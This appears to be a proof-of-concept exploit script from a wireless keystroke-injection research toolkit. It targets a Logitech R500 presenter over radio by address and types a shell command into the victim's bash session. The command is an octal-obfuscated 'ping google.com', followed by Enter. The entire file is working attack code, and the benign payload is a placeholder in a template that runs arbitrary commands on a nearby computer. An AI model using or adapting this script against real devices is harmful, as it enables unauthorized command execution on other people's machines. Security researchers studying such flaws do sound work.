#!/usr/bin/env python2

import time, logging, crcmod, struct
from lib import common
from protocols import *

# Parse command line arguments and initialize the radio
common.init_args('./r500-injector.py')
common.parser.add_argument('-a', '--address', type=str, help='Target address')
common.parse_and_init()

# Parse the address
address = ''
if common.args.address is not None:
  address = common.args.address.replace(':', '').decode('hex')[::-1]
  address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])

# Initialize the target protocol
if len(address) != 5:
  raise Exception('Invalid address: {0}'.format(common.args.address))  
p = Logitech(address, encrypted=True)

# Initialize the injector instance
i = Injector(p)

# Inject "ping google.com" into bash
i.start_injection()
i.inject_string("$'\\160\\151\\156\\147' $'\\147\\157\\157\\147\\154\\145\\056\\143\\157\\155'")
i.send_enter()
i.stop_injection()

